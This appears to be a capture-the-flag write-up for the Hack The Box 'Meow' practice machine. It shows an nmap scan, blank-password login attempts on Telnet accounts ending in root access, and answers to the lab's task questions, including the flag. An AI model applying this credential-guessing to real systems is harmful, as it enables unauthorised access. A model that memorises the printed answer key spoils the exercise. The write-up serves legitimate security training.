---
title: HackTheBox - Meow
authors: Samarth
date: 2023-09-10 14:00:00 +0530
categories: [HackTheBox , Starting Point - Tier 0]
tags: [Linux, Telnet, Weak Credentials, Misconfiguration, Reconnaissance]
math: true
mermaid: true
---

![Meow-HTB](/assets/images/starting-point/Meow-HTB/banner.png)

## TL;DR

This writeup is based on the [__Meow__](https://app.hackthebox.com/starting-point){:target="_blank"} machine, which is an easy-rated Linux box on Hack the Box. I began by scanning the target and found an open `Telnet port (23)`. After enumerating the service, I attempted logging in with common usernames and blank passwords. While `admin` and `administrator` failed, I successfully accessed the system using the `root` account with no password. With root access, I retrieved the flag and completed the challenge.


## Scanning Network

I began by performing an Nmap scan, which revealed open ports 23 , corresponding to telnet. Here are the results from Nmap scan:

```bash
nmap -sC -sV -A -T4 -Pn -oN scan/normal.scan 10.129.223.201
Nmap scan report for 10.129.223.201
Host is up (0.22s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
23/tcp open  telnet  Linux telnetd
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Enumeration

`Telnet` is a network protocol that enables remote communication with devices using a text-based interface over TCP, typically on port `23`. It allows users to access and manage systems but transmits data in plaintext, making it insecure. Due to its lack of encryption, Telnet has largely been replaced by SSH for secure remote access. However, it is still useful for testing network services, checking open ports, and interacting with protocols like HTTP and SMTP.

While doing some Google searches on this protocol, I found out that it is an old service used for the remote management of other hosts on the network.  

Since the target is running this service, it can receive Telnet connection requests from other hosts on the network.  

Connection requests through Telnet are configured with a combination of a username and password for increased security.

```bash
telnet 10.129.223.201 23
Trying 10.129.223.201...
Connected to 10.129.223.201.
Escape character is '^]'.

  █  █         ▐▌     ▄█▄ █          ▄▄▄▄
  █▄▄█ ▀▀█ █▀▀ ▐▌▄▀    █  █▀█ █▀█    █▌▄█ ▄▀▀▄ ▀▄▀
  █  █ █▄█ █▄▄ ▐█▀▄    █  █ █ █▄▄    █▌▄█ ▀▄▄▀ █▀█


Meow login: 
```

I have to find some credentials to continue the work since I don't have any other ports on the target.

Sometimes due to configuration issue, some important accounts can be left without a passwords. We can brute force some typical important account such as `admin`, `administrator`,`root` with blank password.

```bash
telnet 10.129.223.201 23
Trying 10.129.223.201...
Connected to 10.129.223.201.
Escape character is '^]'.

  █  █         ▐▌     ▄█▄ █          ▄▄▄▄
  █▄▄█ ▀▀█ █▀▀ ▐▌▄▀    █  █▀█ █▀█    █▌▄█ ▄▀▀▄ ▀▄▀
  █  █ █▄█ █▄▄ ▐█▀▄    █  █ █ █▄▄    █▌▄█ ▀▄▄▀ █▀█


Meow login: admin
Password: 

Login incorrect
Meow login: administrator
Password: 

Login incorrect
```

## Exploitation

The first two try were unlucky. Let's try `root` account for login.

```bash
 telnet 10.129.223.201 23
Trying 10.129.223.201...
Connected to 10.129.223.201.
Escape character is '^]'.

  █  █         ▐▌     ▄█▄ █          ▄▄▄▄
  █▄▄█ ▀▀█ █▀▀ ▐▌▄▀    █  █▀█ █▀█    █▌▄█ ▄▀▀▄ ▀▄▀
  █  █ █▄█ █▄▄ ▐█▀▄    █  █ █ █▄▄    █▌▄█ ▀▄▄▀ █▀█


Meow login: root
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat 15 Feb 2025 04:29:29 AM UTC

  System load:           0.22
  Usage of /:            41.7% of 7.75GB
  Memory usage:          4%
  Swap usage:            0%
  Processes:             134
  Users logged in:       0
  IPv4 address for eth0: 10.129.223.201
  IPv6 address for eth0: dead:beef::250:56ff:fe94:e0f1

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

75 updates can be applied immediately.
31 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sat Feb 15 04:16:18 UTC 2025 on pts/0
root@Meow:~# 
```

I have successfully logged in as `root` user in target machine. So, let's read the flag now.

```bash
root@Meow:~# ls
flag.txt  snap
root@Meow:~# cat flag.txt 
b40abdfe23665f766f9c61ecba8a4c19
root@Meow:~# exit
```

## Tasks

### What does the acronym VM stand for?

```plaintext
Virtual Machine
```
### What tool do we use to interact with the operating system in order to issue commands via the command line, such as the one to start our VPN connection? It's also known as a console or shell.

```plaintext
terminal
```

### What service do we use to form our VPN connection into HTB labs?

```plaintext
openvpn
```

### What tool do we use to test our connection to the target with an ICMP echo request?

```plaintext
ping
```

### What is the name of the most common tool for finding open ports on a target?

```plaintext
nmap
```

### What service do we identify on port 23/tcp during our scans?

```plaintext
telnet
```

### What username is able to log into the target over telnet with a blank password?

```plaintext
root
```

### Submit root flag

```plaintext
b40abdfe23665f766f9c61ecba8a4c19
```

Thanks for reading this far. If you enjoyed the writeup, do support me [__here__](https://www.buymeacoffee.com/h4xplo1t){:target="_blank"}.